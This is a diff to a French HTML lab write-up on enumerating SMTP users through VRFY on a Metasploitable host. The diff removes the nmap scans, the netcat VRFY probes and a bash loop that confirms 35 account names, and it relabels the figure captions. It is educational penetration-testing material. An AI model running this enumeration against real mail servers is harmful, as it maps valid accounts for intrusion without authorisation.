@@ -31,15 +31,6 @@
   </blockquote>
 
   <h2 class="section">1. Identification</h2>
-  <pre class="terminal">$ nmap -sC -sV -p 25 192.168.56.102
-25/tcp open  smtp    Postfix smtpd
-| smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000,
-VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
-
-$ nmap --script smtp-enum-users -p 25 192.168.56.102
-| smtp-enum-users:
-|_  Method RCPT returned a unhandled status code.</pre>
-
   <p><strong>Postfix</strong>, et surtout : <strong><code>VRFY</code> est annoncé</strong> dans
   les commandes supportées — signal direct que l'énumération d'utilisateurs est possible. La
   méthode <strong>par défaut</strong> du script automatisé (<code>RCPT</code>) échoue ; plutôt
@@ -49,20 +40,13 @@ $ nmap --script smtp-enum-users -p 25 192.168.56.102
   <figure class="capture" id="cap-recon">
     <img src="../images/ms1-smtp/01-recon-nmap.png" alt="Scan nmap et échec de smtp-enum-users (méthode RCPT)">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc"><code>smtp-commands</code> annonce <code>VRFY</code> ; le script
       automatisé (méthode <code>RCPT</code>) échoue.</span>
-      <span class="fname">images/ms1-smtp/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">2. Méthode manuelle (protocole SMTP brut)</h2>
-  <pre class="terminal">$ printf 'VRFY root\r\nQUIT\r\n' | nc -w3 192.168.56.102 25
-252 2.0.0 root
-
-$ printf 'VRFY nonexistentuser123\r\nQUIT\r\n' | nc -w3 192.168.56.102 25
-550 5.1.1 &lt;nonexistentuser123&gt;: Recipient address rejected: User unknown in local recipient table</pre>
-
   <p><strong><code>252</code></strong> pour un compte valide (Postfix ne confirme pas
   formellement comme le ferait <code>250</code> au sens strict RFC, mais <code>252</code> =
   "je ne peux pas vérifier mais j'accepterai le message", signal fiable),
@@ -73,25 +57,15 @@ $ printf 'VRFY nonexistentuser123\r\nQUIT\r\n' | nc -w3 192.168.56.102 25
   <figure class="capture" id="cap-vrfy">
     <img src="../images/ms1-smtp/02-vrfy-manuel.png" alt="VRFY sur compte valide (252) vs inventé (550)">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc"><code>252 2.0.0 root</code> (valide) contre
       <code>550 ... User unknown</code> (inventé) — l'oracle d'énumération.</span>
-      <span class="fname">images/ms1-smtp/02-vrfy-manuel.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">3. Démarche d'exploitation — énumération en lot</h2>
   <p>Test des 35 comptes déjà obtenus via RID cycling SMB (<a href="samba-enum.html">samba-enum.html</a>),
   en boucle :</p>
-
-  <pre class="terminal">USERS=(games nobody bind proxy syslog user www-data root news postgres bin mail distccd
-       proftpd dhcp daemon sshd man lp mysql gnats libuuid backup msfadmin telnetd sys klog
-       postfix service list irc ftp tomcat55 sync uucp)
-for u in "${USERS[@]}"; do
-  resp=$(printf 'VRFY %s\r\nQUIT\r\n' "$u" | nc -w2 192.168.56.102 25)
-  echo "$resp" | grep -qE "^25[02] " && echo "$u : valide"
-done
-echo "Comptes confirmés valides : 35 / 35"</pre>
 
   <p>⚠️ Piège d'outillage rencontré (pas un piège de la cible) : en <strong>zsh</strong>,
   <code>for u in $USERS</code> (variable non tableau, non quotée) ne découpe pas la chaîne en
@@ -101,11 +75,10 @@ echo "Comptes confirmés valides : 35 / 35"</pre>
   <figure class="capture" id="cap-lot">
     <img src="../images/ms1-smtp/03-enum-lot.png" alt="Énumération en lot des 35 comptes, résultat 35/35">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Les <strong>35 comptes</strong> identifiés via Samba sont tous
       confirmés comme destinataires SMTP valides — recoupement complet entre deux services
       indépendants.</span>
-      <span class="fname">images/ms1-smtp/03-enum-lot.png</span>
     </figcaption>
   </figure>
 
